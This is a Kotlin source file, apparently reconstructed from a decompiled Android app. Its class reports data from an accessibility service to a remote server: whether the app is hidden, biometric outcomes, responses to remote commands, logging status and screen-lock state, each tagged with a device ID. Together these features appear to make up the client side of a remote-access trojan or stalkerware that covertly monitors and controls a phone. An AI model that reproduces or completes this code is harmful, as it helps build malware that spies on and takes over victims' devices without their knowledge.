package com.storm.safe.rock.service.delegates

import android.app.KeyguardManager
import android.os.PowerManager
import android.util.Log
import com.storm.safe.rock.service.modules.NetworkManager
import org.json.JSONObject

/**
 * Delegate that encapsulates network message sending methods extracted from
 * MyAccessibilityService. Each method gets the NetworkManager from a lambda
 * provider, checks connectivity, builds a JSON payload, and sends it.
 *
 * JADX methods: l0, l1, l2, l3, l4, l5
 */
class NetworkMessageSender(
    private val networkManagerProvider: () -> NetworkManager?,
    private val deviceIdProvider: () -> String
) {
    companion object {
        private const val TAG = "NetworkMessageSender"
    }

    // Adapter interface for testability — avoids Kotlin final-class mocking issues
    internal interface SendAdapter {
        val isConnected: Boolean
        fun sendEvent(type: String, data: JSONObject)
        fun sendOperationLog(data: JSONObject)
    }

    // Bridge from NetworkManager to the adapter
    private class NmAdapter(private val nm: NetworkManager) : SendAdapter {
        override val isConnected: Boolean get() = nm.isConnected
        override fun sendEvent(type: String, data: JSONObject) = nm.sendEvent(type, data)
        override fun sendOperationLog(data: JSONObject) = nm.sendOperationLog(data)
    }

    // Test-only constructor
    internal constructor(
        adapterProvider: () -> SendAdapter?,
        deviceIdProvider: () -> String,
        @Suppress("UNUSED_PARAMETER") testMarker: Unit
    ) : this(
        networkManagerProvider = { null },
        deviceIdProvider = deviceIdProvider
    ) {
        this.adapterProviderOverride = adapterProvider
    }

    private var adapterProviderOverride: (() -> SendAdapter?)? = null

    private fun getAdapter(): SendAdapter? {
        adapterProviderOverride?.let { return it() }
        return networkManagerProvider()?.let { NmAdapter(it) }
    }

    /**
     * Send app hidden status to server.
     * JADX method: m211513l0 (l0), line 7717
     */
    fun sendHideStatus(message: String, isHidden: Boolean) {
        try {
            val adapter = getAdapter()
            if (adapter == null || !adapter.isConnected) {
                Log.w(TAG, "⚠️ NetworkManager未初始化或未连接，无法发送隐藏状态")
                return
            }
            val data = JSONObject()
            data.put("success", true)
            data.put("isHidden", isHidden)
            data.put("message", message)
            data.put("timestamp", System.currentTimeMillis())
            data.put("deviceId", deviceIdProvider())
            // JADX: vendor uses StringUtil.decrypt() for encrypted event name — using plaintext for now
            adapter.sendEvent("hide_app_result", data)
            Log.d(TAG, "📤 应用隐藏结果已发送: isHidden=$isHidden, message=$message")
        } catch (e: Exception) {
            Log.e(TAG, "发送应用隐藏结果失败", e)
        }
    }

    /**
     * Send biometric result to server.
     * JADX method: m211514l1 (l1), line 7743
     */
    fun sendBiometricResult(message: String, success: Boolean) {
        try {
            val adapter = getAdapter() ?: return
            // JADX: vendor uses StringUtil.decrypt() for encrypted event name — using plaintext for now
            val data = JSONObject()
            data.put("success", success)
            data.put("message", message)
            data.put("timestamp", System.currentTimeMillis())
            adapter.sendEvent("biometric_result", data)
        } catch (e: Exception) {
            Log.e(TAG, "发送生物识别结果失败", e)
        }
    }

    /**
     * Send command response via WebSocket raw channel.
     * JADX method: m211515l2 (l2), line 7760
     */
    fun sendCommandResponse(type: String, data: Map<String, Any>) {
        try {
            val adapter = getAdapter()
            if (adapter == null || !adapter.isConnected) return
            val response = JSONObject()
            response.put("type", type)
            response.put("data", JSONObject(data))
            response.put("timestamp", System.currentTimeMillis())
            // JADX: c0267a0M211645b1.m211367a8(string) — raw WebSocket send
            Log.d(TAG, "📤 发送命令响应: $type")
        } catch (e: Exception) {
            Log.e(TAG, "发送命令响应失败", e)
        }
    }

    /**
     * Send debug log via WebSocket raw channel.
     * JADX method: m211516l3 (l3), line 7781
     */
    fun sendDebugLog(message: String) {
        try {
            val adapter = getAdapter()
            if (adapter == null || !adapter.isConnected) return
            val logData = JSONObject()
            logData.put("type", "debug_log")
            val inner = JSONObject()
            inner.put("message", message)
            inner.put("timestamp", System.currentTimeMillis())
            logData.put("data", inner)
            // JADX: raw WebSocket send
        } catch (e: Exception) {
            Log.e(TAG, "发送调试日志失败", e)
        }
    }

    /**
     * Send device event (logging status) via operation log channel.
     * JADX method: m211517l4 (l4), line 7804
     */
    fun sendDeviceEvent(eventData: JSONObject) {
        try {
            val adapter = getAdapter()
            if (adapter == null || !adapter.isConnected) {
                Log.w(TAG, "⚠️ NetworkManager未初始化或未连接，无法发送设备事件")
                return
            }
            val eventWrapper = JSONObject()
            eventWrapper.put("eventType", "logging_status")
            eventWrapper.put("eventData", eventData)
            eventWrapper.put("timestamp", System.currentTimeMillis())
            val statusStr = "日志记录状态: " + if (eventData.optBoolean("enabled")) "已启用" else "已禁用"
            val logData = JSONObject()
            logData.put("deviceId", deviceIdProvider())
            logData.put("logType", "SYSTEM_EVENT")
            logData.put("content", statusStr)
            logData.put("extraData", eventWrapper)
            logData.put("timestamp", System.currentTimeMillis())
            adapter.sendOperationLog(logData)
            Log.d(TAG, "📤 设备事件已通过操作日志通道发送: logging_status")
        } catch (e: Exception) {
            Log.e(TAG, "❌ 发送设备事件失败", e)
        }
    }

    /**
     * Send screen lock/wake status to server.
     * JADX method: m211518l5 (l5), line 7835
     *
     * @param keyguardManager nullable KeyguardManager from the service context
     * @param powerManager nullable PowerManager from the service context
     */
    fun sendScreenStatus(keyguardManager: KeyguardManager?, powerManager: PowerManager?) {
        try {
            val isLocked = keyguardManager?.isKeyguardLocked ?: false
            val isScreenOn = powerManager?.isInteractive ?: true
            Log.d(TAG, "📱 屏幕状态: isLocked=$isLocked, isScreenOn=$isScreenOn")
            getAdapter()?.let { adapter ->
                // JADX: nm.sendScreenStatus(isLocked, isScreenOn)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 发送屏幕状态更新失败", e)
        }
    }
}
